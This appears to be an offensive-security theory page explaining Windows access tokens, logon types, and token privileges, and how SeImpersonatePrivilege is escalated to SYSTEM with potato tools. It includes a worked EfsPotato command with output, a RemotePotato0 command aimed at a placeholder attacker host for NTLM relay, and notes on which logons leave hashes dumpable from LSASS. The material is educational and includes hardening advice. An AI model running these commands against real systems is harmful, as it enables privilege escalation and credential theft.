---
title: Windows Logon Types and Privileges
layout: post
date: 2026-07-29
description: "How Windows represents a security context through access tokens, what the different logon types mean for credential recovery, and how token privileges such as SeImpersonatePrivilege are abused with the potato family of attacks to escalate a service account to SYSTEM."
permalink: /theory/windows/logon-and-privileges/
---

# Windows Logon Types and Privileges

## Overview

When you land in a Windows context, two questions decide what you can do next, and both are answered by the account's **access token**:

1. **How did this account log on?** The *logon type* tells you whether reusable credentials were left in memory to steal, and how the session was established.
2. **What privileges does the token hold?** `whoami /priv` lists them. A handful of these privileges are effectively "become SYSTEM" buttons, the most common being `SeImpersonatePrivilege`.

This page builds up from the access token, through logon types, to the privileges that matter for escalation, and finishes with the **potato** technique that turns `SeImpersonatePrivilege` into SYSTEM.

## Access Tokens

Every process and thread on Windows carries an **access token**: the kernel object that describes *who* the code is running as. A token holds:

- the **user SID** and the **group SIDs** the account belongs to,
- the list of **privileges** (the `Se...Privilege` entries),
- an **integrity level** (Low, Medium, High, System),
- and, for impersonation, an **impersonation level**.

There are two kinds of token:

- **Primary token**: attached to a process. It is the default identity every thread in that process runs under.
- **Impersonation token**: attached to a single thread, letting *that thread* temporarily act as a different user. This is how a server "becomes" the client that called it, just long enough to touch a resource on the client's behalf.

An impersonation token also has an **impersonation level** that caps what the receiver may do with it:

| Level | What the holder can do |
|---|---|
| Anonymous | Nothing about the client |
| Identification | Check who the client is |
| Impersonation | Act as the client locally |
| Delegation | Act as the client on other hosts |

The whole potato technique below hinges on obtaining an **Impersonation**-level (or better) token for a SYSTEM account and then running code with it.

## Logon Types

Windows records *how* an account authenticated as a numeric **logon type**, visible in Security event ID `4624` (and `4625` for failures). The type is not just forensic trivia: it tells an attacker whether the logon left credentials in `LSASS` that can be reused.

| Type | Name | Triggered by |
|---|---|---|
| 2 | Interactive | Console logon, `runas` |
| 3 | Network | SMB, WinRM, share access |
| 4 | Batch | Scheduled tasks |
| 5 | Service | Service startup |
| 7 | Unlock | Workstation unlock |
| 8 | NetworkCleartext | IIS basic auth |
| 9 | NewCredentials | `runas /netonly` |
| 10 | RemoteInteractive | RDP / Terminal Services |
| 11 | CachedInteractive | Cached domain logon |

The practical question is always "did this logon leave something reusable behind?"

| Logon type | Reusable secret in memory |
|---|---|
| 2, 10 | Yes (NT hash, often more) |
| 4, 5 | Yes (batch / service creds) |
| 8 | Yes (cleartext password) |
| 3 | No, by design |
| 9 | Network identity only |

- **Interactive (2) and RemoteInteractive (10)** load the account's secrets into `LSASS` so single sign-on works, which is exactly what `mimikatz` / `lsassy` recover. A box where an admin RDPs in is a box where their hash is dumpable.
- **Network (3)** is the important negative case. When a user reaches a share or a WinRM endpoint, the logon proves knowledge of the secret but does **not** cache a reusable copy on the target. Dumping `LSASS` after a pure type-3 access usually yields nothing for that user.
- **NetworkCleartext (8)** is the gift: protocols such as IIS Basic auth hand the server the *plaintext*, which stays recoverable.
- **NewCredentials (9)** (`runas /netonly`) keeps the local token but attaches different credentials for outbound network auth, which is why the local `whoami` looks unchanged while SMB/LDAP go out as someone else.

The logon type also decides whether your session can *see other sessions*. Interactive, RemoteInteractive, and Batch logons run inside a Terminal Services session, so the session-enumeration APIs (`WTSEnumerateSessions`, which back `query user` / `qwinsta`) work. A pure Network logon (type 3), which is what WinRM / Evil-WinRM gives you, has no TS session context, so `query user` returns nothing even when other users are logged on. To spot a privileged user's console session, the prerequisite for the cross-session attack below, you often have to trade the WinRM network logon for an interactive or batch one, for example by relaunching through `RunasCs.exe`.

## Token Privileges

Beyond identity, a token carries **privileges**: named rights like "back up files" or "debug programs". They are assigned per logon (from the account's user-rights assignments), present in the token even when shown as `Disabled`, and the holder can enable any privilege its token contains at will. So `Disabled` in `whoami /priv` means "available, not yet turned on", not "denied".

A small set of privileges is equivalent to full control of the machine:

| Privilege | Why it is dangerous |
|---|---|
| SeImpersonate | Potato attacks to SYSTEM |
| SeAssignPrimaryToken | Launch a process as another token |
| SeDebug | Open / inject any process (LSASS) |
| SeBackup | Read any file, bypassing the DACL |
| SeRestore | Write any file, bypassing the DACL |
| SeTakeOwnership | Take ownership of any object |
| SeLoadDriver | Load a driver, reach kernel code |
| SeTcb | Act as part of the operating system |
| SeManageVolume | Full raw access to a volume |
| SeCreateToken | Forge an arbitrary token |

`SeBackup`/`SeRestore` read out `SAM`, `SYSTEM`, and `NTDS.dit`; `SeDebug` dumps `LSASS`; `SeLoadDriver` reaches the kernel. But the one you meet most often on foothold hosts is `SeImpersonatePrivilege`, because it is granted by default to the service accounts that web apps, databases, and app pools run under.

## SeImpersonatePrivilege and the Potato Technique

### Why service accounts hold it

`SeImpersonatePrivilege` exists for a legitimate reason: a server process often needs to act *as the client that called it*. A database service accepting a Windows-authenticated connection, or IIS serving an authenticated user, impersonates that caller to check access to files and other resources. So the built-in service identities (`LOCAL SERVICE`, `NETWORK SERVICE`) and most accounts configured to run services are granted "Impersonate a client after authentication".

That is also why it is so valuable to an attacker: **any code execution inside a service context (SQL Server `xp_cmdshell`, an IIS webshell, a compromised service account) starts out already holding `SeImpersonatePrivilege`.**

### The generic primitive

Every "potato" is the same five-step pattern. The only thing that changes between variants is step 3, how you force a SYSTEM process to authenticate to you.

1. You run in a process that holds `SeImpersonatePrivilege` but is otherwise low or medium privileged.
2. You stand up a **local listener you control**, a named pipe, a COM object, or a rogue RPC/OXID endpoint.
3. You **coerce a SYSTEM (or otherwise privileged) service to authenticate to that listener**. Because the service authenticates locally, you receive its token material.
4. You call `ImpersonateNamedPipeClient` (or the COM/RPC equivalent) to put that **SYSTEM impersonation token** on your thread.
5. You spawn a new process with it, `CreateProcessWithTokenW` (needs `SeImpersonatePrivilege`) or `CreateProcessAsUser` (needs `SeAssignPrimaryTokenPrivilege`), and that process runs as `NT AUTHORITY\SYSTEM`.

### The variants

| Tool | Coercion vector | Typical target |
|---|---|---|
| RottenPotato | DCOM NTLM to local | Legacy |
| JuicyPotato | DCOM CLSID activation | <= 2016 / 1809 |
| RoguePotato | Fake OXID resolver | 2019 |
| PrintSpoofer | Print Spooler pipe | 2016 / 2019 |
| EfsPotato | MS-EFSR over `lsarpc` | 2016 to 2022 |
| GodPotato | DCOM `IStorage` | 2012 to 2022 |

- **JuicyPotato** weaponized the original DCOM trick with a selectable CLSID and port, but Server 2019 stopped the default activation, so it fails there.
- **RoguePotato** and **GodPotato** revive the DCOM approach on modern Windows through a fake OXID resolver / `IStorage` marshalling, with GodPotato covering the widest version range.
- **PrintSpoofer** abuses the Print Spooler's `RpcRemoteFindFirstPrinterChangeNotificationEx` to connect the spooler (SYSTEM) to your named pipe.
- **EfsPotato / SharpEfsPotato** abuse the Encrypting File System Remote protocol (MS-EFSR), calling methods such as `EfsRpcEncryptFileSrv` to make `lsass` authenticate to a local pipe (`\pipe\lsarpc`). This is the CVE-2021-36942 family and it keeps working through recent Server builds, which is why it is a reliable default when the spooler is disabled.

### Worked example (EfsPotato)

Confirm the privilege is present and enabled:

```powershell
whoami /priv
```

```
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

Run the exploit. The `whoami` payload proves the token swap succeeded, the process reports its own identity (the service account) and then runs the command as SYSTEM:

```powershell
EfsPotato.exe whoami
```

```
[+] Current user: DOMAIN\svc_account
[!] process with pid: 1072 created.
==============================
nt authority\system
```

From here any payload, a reverse shell, adding an admin, or reading a protected file, runs as SYSTEM. The escalation is complete the moment `SeImpersonatePrivilege` meets a coercible SYSTEM service.

{: .prompt-danger}
> Treat every service account as one step from SYSTEM on its host. Do not run services as accounts with `SeImpersonatePrivilege` you would not trust as SYSTEM, prefer virtual / managed service accounts scoped to the service, and keep the machine patched so the individual coercion vectors (spooler, EFSR, DCOM) are not trivially reachable.

## Cross-Session Attacks: RemotePotato0

The local potatoes above turn *your own* `SeImpersonatePrivilege` into SYSTEM. **RemotePotato0** solves a different problem: escalating by stealing the identity of a *different, more privileged user who is logged on to the same machine*, and it needs neither `SeImpersonatePrivilege` nor admin rights on your part.

The requirement is a second, higher-value **interactive session** on the host, for example a domain admin with an open RDP or console session (this is why the logon-type note above matters, you first have to be able to see that session). Given one, a low-privileged foothold can:

1. Trigger a **cross-session DCOM activation**. Windows normally blocks activating a DCOM object in another user's session, but RemotePotato0 abuses the RPCSS / OXID resolver to make a component run in the *victim's* session.
2. That component authenticates over NTLM **as the victim**. RemotePotato0 stands up a fake OXID resolver and an RPC relay that redirect the victim's NTLM authentication back to the attacker.
3. The captured NTLM is then either **cracked offline** or **relayed** (with `ntlmrelayx`) to a target such as LDAP on the domain controller, letting you act as the victim: add yourself to a group, configure RBCD, and so on.

```powershell
.\RemotePotato0.exe -r <ATTACKER-IP> -p 9999 -x <ATTACKER-IP> -e 9998
```
> `-r` and `-x` point at the attacker host running the OXID resolver and relay socket; `-p` and `-e` are the listening ports. Pair it with `ntlmrelayx -t ldap://<DC>` when relaying rather than capturing to crack.
{: .prompt-info}

The distinction from the local family is the important part: RemotePotato0 does not make *you* SYSTEM on the box, it hands you *another user's* authentication. That is why it depends on an active victim session (a logon-type fact) rather than on a token privilege you already hold.

## Examples on this site

Boxes that use a token-privilege or logon abuse technique, listed automatically from their tags (add a matching tag to `priv_tags` below to include a new one):

{% assign priv_tags = "seimpersonateprivilege,remotepotato0" | split: "," -%}
{% for post in site.posts -%}
{%- assign match = false -%}
{%- for t in post.tags -%}
{%- if priv_tags contains t -%}{%- assign match = true -%}{%- endif -%}
{%- endfor -%}
{%- if match %}
- [{{ post.title }}]({{ post.url }}){% endif -%}
{%- endfor %}

## References

- [Microsoft - Logon types (LOGON32_LOGON constants)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera)
- [Microsoft - Privilege constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
- [itm4n - PrintSpoofer: Abusing Impersonation Privileges](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [ohpe / decoder - JuicyPotato](https://github.com/ohpe/juicy-potato)
- [zcgonvh - EfsPotato](https://github.com/zcgonvh/EfsPotato)
